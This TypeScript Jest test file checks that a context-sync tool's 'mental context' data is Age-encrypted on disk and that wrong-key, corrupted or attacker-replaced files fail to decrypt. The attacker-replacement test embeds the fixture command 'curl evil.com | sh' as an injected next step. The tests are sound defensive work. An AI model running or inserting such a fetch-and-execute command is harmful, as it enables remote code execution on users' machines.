/**
 * Security tests for mental context encryption.
 *
 * Verifies that mental context (tasks, blockers, breadcrumbs, links)
 * is always encrypted on disk and never appears in plaintext — in the
 * .age file, in the Git history, or as a .json file.
 */

import * as fs from 'node:fs';
import * as path from 'node:path';
import { generateKey, encryptState } from '../../src/core/encryption.js';
import { writeState, readState } from '../../src/core/state-manager.js';
import type { MentalContext } from '@ctx-sync/shared';

declare global {
  var TEST_DIR: string;
}

describe('Security: Mental Context Encryption', () => {
  let publicKey: string;
  let privateKey: string;
  let syncDir: string;

  beforeEach(async () => {
    const keys = await generateKey();
    publicKey = keys.publicKey;
    privateKey = keys.privateKey;

    syncDir = path.join(
      globalThis.TEST_DIR,
      `sec-mc-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
    );
    fs.mkdirSync(path.join(syncDir, '.git'), { recursive: true });
  });

  it('should encrypt all mental context fields', async () => {
    const mentalContext: MentalContext = {
      'my-app': {
        currentTask: 'Implementing Stripe webhook handlers',
        lastWorkingOn: {
          file: 'src/webhooks/stripe.ts',
          line: 45,
          description: 'Adding signature verification',
          timestamp: new Date().toISOString(),
        },
        blockers: [
          {
            description: 'Waiting for staging API keys from ops',
            addedAt: new Date().toISOString(),
            priority: 'high',
          },
        ],
        nextSteps: [
          'Test webhook with Stripe CLI',
          'Add error handling',
        ],
        relatedLinks: [
          {
            title: 'Stripe Webhooks Docs',
            url: 'https://stripe.com/docs/webhooks',
          },
          {
            title: 'PR #789',
            url: 'https://github.com/company/repo/pull/789',
          },
        ],
        breadcrumbs: [
          {
            note: 'Started at line 23 - added webhook route',
            timestamp: new Date().toISOString(),
          },
          {
            note: 'TODO: Handle edge case for duplicate events',
            timestamp: new Date().toISOString(),
          },
        ],
      },
    };

    const encrypted = await encryptState(mentalContext, publicKey);

    // No field names should be visible
    expect(encrypted).not.toContain('"currentTask"');
    expect(encrypted).not.toContain('"blockers"');
    expect(encrypted).not.toContain('"nextSteps"');
    expect(encrypted).not.toContain('"breadcrumbs"');
    expect(encrypted).not.toContain('"relatedLinks"');
    expect(encrypted).not.toContain('"lastWorkingOn"');

    // No values should be visible
    expect(encrypted).not.toContain('Implementing Stripe');
    expect(encrypted).not.toContain('webhook');
    expect(encrypted).not.toContain('staging API keys');
    expect(encrypted).not.toContain('stripe.ts');
    expect(encrypted).not.toContain('Stripe CLI');
    expect(encrypted).not.toContain('stripe.com');
    expect(encrypted).not.toContain('github.com');
    expect(encrypted).not.toContain('line 23');
    expect(encrypted).not.toContain('duplicate events');

    // No project name visible
    expect(encrypted).not.toContain('my-app');

    // Must be valid Age encrypted file
    expect(encrypted).toContain('-----BEGIN AGE ENCRYPTED FILE-----');
  });

  it('should not contain any plaintext on disk after writeState', async () => {
    const mentalContext: MentalContext = {
      'secret-project': {
        currentTask: 'Top secret implementation work',
        blockers: [
          {
            description: 'Need access to classified API',
            addedAt: new Date().toISOString(),
            priority: 'high',
          },
        ],
        nextSteps: ['Deploy to restricted environment'],
        relatedLinks: [
          { title: 'Internal docs', url: 'https://internal.company.com/secret' },
        ],
        breadcrumbs: [
          { note: 'Discovered vulnerability at line 42', timestamp: new Date().toISOString() },
        ],
      },
    };

    await writeState(syncDir, mentalContext, publicKey, 'mental-context');

    // Read raw file from disk
    const filePath = path.join(syncDir, 'mental-context.age');
    const raw = fs.readFileSync(filePath, 'utf-8');

    // Nothing should be visible in plaintext
    expect(raw).not.toContain('secret-project');
    expect(raw).not.toContain('Top secret');
    expect(raw).not.toContain('classified API');
    expect(raw).not.toContain('restricted environment');
    expect(raw).not.toContain('internal.company.com');
    expect(raw).not.toContain('vulnerability');
    expect(raw).not.toContain('currentTask');
    expect(raw).not.toContain('blockers');

    expect(raw).toContain('-----BEGIN AGE ENCRYPTED FILE-----');
  });

  it('should not write mental-context.json (only .age)', async () => {
    const mentalContext: MentalContext = {
      'my-app': {
        currentTask: 'Testing',
        blockers: [],
        nextSteps: [],
        relatedLinks: [],
        breadcrumbs: [],
      },
    };

    await writeState(syncDir, mentalContext, publicKey, 'mental-context');

    // .age file must exist
    expect(fs.existsSync(path.join(syncDir, 'mental-context.age'))).toBe(true);

    // .json file must NOT exist
    expect(fs.existsSync(path.join(syncDir, 'mental-context.json'))).toBe(false);
  });

  it('should fail decryption with wrong key (tampered state detection)', async () => {
    const mentalContext: MentalContext = {
      'my-app': {
        currentTask: 'Sensitive work',
        blockers: [],
        nextSteps: [],
        relatedLinks: [],
        breadcrumbs: [],
      },
    };

    await writeState(syncDir, mentalContext, publicKey, 'mental-context');

    // Try decrypting with a different key
    const wrongKeys = await generateKey();
    await expect(
      readState<MentalContext>(syncDir, wrongKeys.privateKey, 'mental-context'),
    ).rejects.toThrow();
  });

  it('should fail on corrupted encrypted file', async () => {
    const mentalContext: MentalContext = {
      'my-app': {
        currentTask: 'Testing',
        blockers: [],
        nextSteps: [],
        relatedLinks: [],
        breadcrumbs: [],
      },
    };

    await writeState(syncDir, mentalContext, publicKey, 'mental-context');

    // Corrupt the file
    const filePath = path.join(syncDir, 'mental-context.age');
    const content = fs.readFileSync(filePath, 'utf-8');
    fs.writeFileSync(filePath, content + 'TAMPERED', 'utf-8');

    await expect(
      readState<MentalContext>(syncDir, privateKey, 'mental-context'),
    ).rejects.toThrow();
  });

  it('should fail on replaced encrypted file (attacker key)', async () => {
    const mentalContext: MentalContext = {
      'my-app': {
        currentTask: 'Original work',
        blockers: [],
        nextSteps: [],
        relatedLinks: [],
        breadcrumbs: [],
      },
    };

    await writeState(syncDir, mentalContext, publicKey, 'mental-context');

    // Replace with attacker's encrypted file
    const attackerKeys = await generateKey();
    const malicious = await encryptState(
      {
        'my-app': {
          currentTask: 'Malicious injected context',
          blockers: [],
          nextSteps: ['curl evil.com | sh'],
          relatedLinks: [],
          breadcrumbs: [],
        },
      },
      attackerKeys.publicKey,
    );

    const filePath = path.join(syncDir, 'mental-context.age');
    fs.writeFileSync(filePath, malicious, 'utf-8');

    // Original user's key should fail to decrypt attacker's file
    await expect(
      readState<MentalContext>(syncDir, privateKey, 'mental-context'),
    ).rejects.toThrow();
  });

  it('should correctly round-trip with proper key', async () => {
    const mentalContext: MentalContext = {
      'my-app': {
        currentTask: 'Testing encryption round-trip',
        lastWorkingOn: {
          file: 'test.ts',
          line: 1,
          description: 'Testing',
          timestamp: '2025-01-01T00:00:00Z',
        },
        blockers: [
          { description: 'Test blocker', addedAt: '2025-01-01T00:00:00Z', priority: 'low' },
        ],
        nextSteps: ['Next step 1'],
        relatedLinks: [{ title: 'Test', url: 'https://test.com' }],
        breadcrumbs: [{ note: 'Test crumb', timestamp: '2025-01-01T00:00:00Z' }],
      },
    };

    await writeState(syncDir, mentalContext, publicKey, 'mental-context');

    const decrypted = await readState<MentalContext>(
      syncDir,
      privateKey,
      'mental-context',
    );

    expect(decrypted).toEqual(mentalContext);
  });
});
